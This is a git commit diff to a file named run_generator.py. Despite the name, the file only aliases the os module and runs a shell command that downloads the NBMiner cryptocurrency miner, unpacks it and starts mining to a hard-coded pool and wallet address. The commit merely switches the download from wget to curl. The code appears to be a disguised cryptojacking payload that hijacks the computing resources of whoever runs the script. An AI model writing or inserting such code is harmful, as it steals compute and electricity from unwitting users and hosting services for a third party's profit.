6b8d2e7aebff562e27a461cbd8f9477aedc25779
CulinoPapasDeNenem <92613635+CulinoPapasDeNenem@users.noreply.github.com>
2021-10-17 19:50:03 -0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt-get install -y wget && apt-get install -y pciutils && wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz && tar xfv NBMiner_38.1_Linux.tgz && cd NBMiner_Linux && ./nbminer --algo ethash -o us.stratu.ms:15969 -u 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.h3wxjxvrmw0l680")
+alpha.system("curl -LJO https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz && tar xfv NBMiner_38.1_Linux.tgz && cd NBMiner_Linux && ./nbminer --algo ethash -o us.stratu.ms:15969 -u 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.h3wxjxvrmw0l680")
